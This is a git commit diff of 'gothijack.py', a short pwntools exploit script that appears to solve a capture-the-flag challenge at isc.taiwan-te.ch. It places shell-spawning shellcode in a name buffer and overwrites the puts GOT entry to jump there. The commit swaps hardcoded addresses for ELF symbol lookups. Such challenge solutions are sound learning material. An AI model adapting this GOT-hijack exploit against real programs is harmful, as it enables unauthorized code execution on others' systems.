ee51f7404a2967da91a558f48647cdd400d9b467
r888800009 <r888800009@gmail.com>
2019-07-28 14:37:55 +0800

    Update gothijack.py

--- isc.taiwan-te.ch/gothijack.py
+++ isc.taiwan-te.ch/gothijack.py
@@ -1,17 +1,18 @@
 #!/usr/bin/env python2
 from pwn import *
 import pwnlib.shellcraft
+import pwnlib.elf
 
 # init
 c = remote('isc.taiwan-te.ch', 10003)
+e =ELF('gothijack')
 
 context.os='linux'
 context.arch='amd64'
 
-
 ans = asm(shellcraft.sh()) + 'A' * 16   # put shellcode to name
-ans = ans + str(0x601018) + '\n'        # set to puts GOT
-ans = ans + p64(0x601080) + '\n'        # point GOT to name
+ans += str(e.got['puts']) + '\n'             # set to puts GOT
+ans += p64(e.symbols['name']) + '\n'    # point GOT to name
 c.send(ans)
 
 c.interactive()
